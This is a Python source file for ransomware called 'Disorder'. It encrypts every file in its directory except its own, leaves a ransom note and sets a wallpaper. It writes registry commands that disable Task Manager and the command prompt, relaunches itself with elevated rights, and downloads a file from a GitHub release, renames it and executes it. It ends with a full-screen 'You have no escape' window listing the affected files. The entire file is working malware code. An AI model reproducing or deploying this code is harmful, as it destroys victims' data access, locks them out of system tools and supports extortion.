from asyncore import read
import os
from cryptography.fernet import Fernet
from tkinter import *
import string
from random import randint, choice
import requests
import urllib.request
from plyer import notification
import ctypes, sys
import time

urllib.request.urlretrieve("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQid3LqE3f3YS28LgP_rgZh0MTQPgCaipp6bQ&usqp=CAU","white.jpg")
urllib.request.urlretrieve("https://github.com/LucaBarbaLata/Disorder/releases/download/Ransomware/mmi.inf","mmi.inf")

username = os.getlogin()

readme = 'You have been encrypted by Disorder. Good luck with opening your important files. :)\n If u want to get them back email me and i will send the decryptor for free!  Good Luck ' + username
bat = 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f\nreg add HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System\nreg add HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 2'


files = []

for file in os.listdir():
    if file == "main.py" or file == "temp.exe" or file == "red.png" or file == "white.jpg" or file == "yup.key" or file == "decrypt.py" or file == "main.exe" or file == "decrypt.exe" or file == "config.ini" or file == "config.jpg" or file == "mmi.inf" or file == "mmi.mp3" or file == "desktop.ini":
            continue
    if os.path.isfile(file):
            files.append(file)

key = Fernet.generate_key()

with open("yup.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
            contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)

with open("README.txt", "w") as f:
        f.write(readme)



with open("temp.bat", "w") as f:
        f.write(bat)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
if is_admin():
    os.system('temp.bat')
    time.sleep(3)
    os.remove("temp.bat")
else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)



os.rename('mmi.inf','mmi.mp3')
os.system('mmi.mp3')


img_dir = "white.jpg"
ctypes.windll.user32.SystemParametersInfoW(20, 0, img_dir, 0)


window = Tk()
window.title("Disorder")
window.geometry("1920x1080")
window.minsize(1000, 600)
window.wm_attributes("-topmost", 1)
window.configure(bg = '#23272a')

frame = Frame(window, bg='#23272a')



salut = Label(frame, text="Ooops!", font=("Helvetica", 20), bg='#23272a', fg='red')
salut.pack()


Moche = Label(frame, text="You have been encrypted. ", font=("Helvetica", 20), bg='#23272a', fg='white')
Moche.pack()

Moche = Label(frame, text="", font=("Helvetica", 20), bg='#23272a', fg='white')
Moche.pack()

Moche = Label(frame, text="You have no escape.", font=("Helvetica", 20), bg='#23272a', fg='white')
Moche.pack()

Moche = Label(frame, text="Important!", font=("Helvetica", 20), bg='#23272a', fg='red')
Moche.pack()

Moche = Label(frame, text="Dont delete the ANY files created by the virus or you will not be able to decrypt the files", font=("Helvetica", 20), bg='#23272a', fg='darkred')
Moche.pack()

Moche = Label(frame, text="", font=("Helvetica", 20), bg='#23272a', fg='white')
Moche.pack()

Moche = Label(frame, text="Affected items:", font=("Helvetica", 20), bg='#23272a', fg='white')
Moche.pack()


Moche = Label(frame, text=files, font=("Helvetica", 20), bg='#23272a', fg='darkred')
Moche.pack()

Moche = Label(frame, text="You can close this window now", font=("Helvetica", 20), bg='#23272a', fg='white')
Moche.pack()

frame.pack(expand=YES)


window.mainloop()